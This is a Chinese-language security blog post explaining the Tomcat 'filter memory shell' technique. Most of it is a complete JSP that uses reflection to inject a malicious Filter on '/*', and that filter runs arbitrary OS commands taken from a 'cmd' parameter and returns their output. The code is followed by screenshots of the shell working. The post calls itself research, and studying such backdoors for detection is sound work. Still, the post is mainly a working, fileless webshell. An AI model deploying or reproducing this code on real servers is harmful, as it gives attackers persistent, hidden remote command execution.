+++
title = "filter内存马"
date = 2026-06-15T19:47:11+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
# 前置步骤

- 获取`StandardContext`；  
- 继承并编写一个恶意`filter`；  
- 实例化一个`FilterDef`类，包装`filter`并存放到`StandardContext.filterDefs`中；  
- 实例化一个`FilterMap`类，将我们的`Filter`和`urlpattern`相对应，使用`addFilterMapBefore`存放到`StandardContext.filterMaps`中；  
- 通过反射获取`filterConfigs`，实例化一个`FilterConfig`（`ApplicationFilterConfig`）类，传入`StandardContext`与`filterDefs`，存放到`filterConfig`中。


# 完整代码


```jsp
<%@ page import="java.lang.reflect.*" %>

<%@ page import="org.apache.catalina.core.StandardContext" %>

<%@ page import="java.util.Map" %>

<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>

<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>

<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>

<%@ page import="org.apache.catalina.Context" %>

<%@ page import="org.apache.catalina.core.ApplicationContext" %>

<%@ page import="java.io.*" %>

<%@ page import="java.util.Scanner" %>

<%@ page import="java.util.List" %>

<%@ page import="java.util.ArrayList" %>

<%

    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");

    appctx.setAccessible(true);

    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");

    stdctx.setAccessible(true);

    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");

    filterConfigsField.setAccessible(true);

    Map filterConfigs = (Map) filterConfigsField.get(standardContext);

    String filterName = getRandomString();

    if (filterConfigs.get(filterName) == null) {

        Filter filter = new Filter() {

            @Override

            public void init(FilterConfig filterConfig) {

            }

  

            @Override

            public void destroy() {

            }

  

            @Override

            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;

                String cmd = httpServletRequest.getParameter("cmd");

                {

                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();

                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");

                    String output = s.hasNext() ? s.next() : "";

                    servletResponse.setCharacterEncoding("GBK");

                    PrintWriter out = servletResponse.getWriter();

                    out.println(output);

                    out.flush();

                    out.close();

                }

                filterChain.doFilter(servletRequest, servletResponse);

            }

        };

        FilterDef filterDef = new FilterDef();

        filterDef.setFilterName(filterName);

        filterDef.setFilterClass(filter.getClass().getName());

        filterDef.setFilter(filter);

        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();

        filterMap.setFilterName(filterName);

        filterMap.addURLPattern("/*");

        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);

        constructor.setAccessible(true);

        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

        filterConfigs.put(filterName, applicationFilterConfig);

        out.print("[+]&nbsp;&nbsp;&nbsp;&nbsp;Malicious filter injection successful!<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Filter name: " + filterName + "<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Below is a list displaying filter names and their corresponding URL patterns:");

        out.println("<table border='1'>");

        out.println("<tr><th>Filter Name</th><th>URL Patterns</th></tr>");

        List<String[]> allUrlPatterns = new ArrayList<>();

        for (Object filterConfigObj : filterConfigs.values()) {

            if (filterConfigObj instanceof ApplicationFilterConfig) {

                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj;

                String filtername = filterConfig.getFilterName();

                FilterDef filterdef = standardContext.findFilterDef(filtername);

                if (filterdef != null) {

                    FilterMap[] filterMaps = standardContext.findFilterMaps();

                    for (FilterMap filtermap : filterMaps) {

                        if (filtermap.getFilterName().equals(filtername)) {

                            String[] urlPatterns = filtermap.getURLPatterns();

                            allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中

  

                            out.println("<tr><td>" + filtername + "</td>");

                            out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");

                        }

                    }

                }

            }

        }

        out.println("</table>");

        for (String[] urlPatterns : allUrlPatterns) {

            for (String pattern : urlPatterns) {

                if (!pattern.equals("/*")) {

                    out.println("[+]&nbsp;&nbsp;&nbsp;&nbsp;shell: http://localhost:8080/servlet" + pattern + "?cmd=ipconfig<br>");

                }

            }

        }

    }

%>

<%!

    private String getRandomString() {

        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        StringBuilder randomString = new StringBuilder();

        for (int i = 0; i < 8; i++) {

            int index = (int) (Math.random() * characters.length());

            randomString.append(characters.charAt(index));

        }

        return randomString.toString();

    }

%>
```



# 运行示例


可以看到已经拦截了但是没有打印出信息  

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518105601042.png)

我们直接执行命令  发现可以被执行了


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518105659453.png)
